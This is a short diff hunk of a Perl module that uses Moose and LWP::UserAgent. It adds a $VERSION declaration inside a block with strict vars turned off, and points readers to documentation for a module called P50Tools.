@@ -7,6 +7,11 @@ use Moose;
 use HTTP::Request;
 use LWP::UserAgent;
 
+{
+    no strict "vars";
+    $VERSION = '0.1';
+}
+
 =head1 
 For more information go to L<P50Tools>.
 =cut
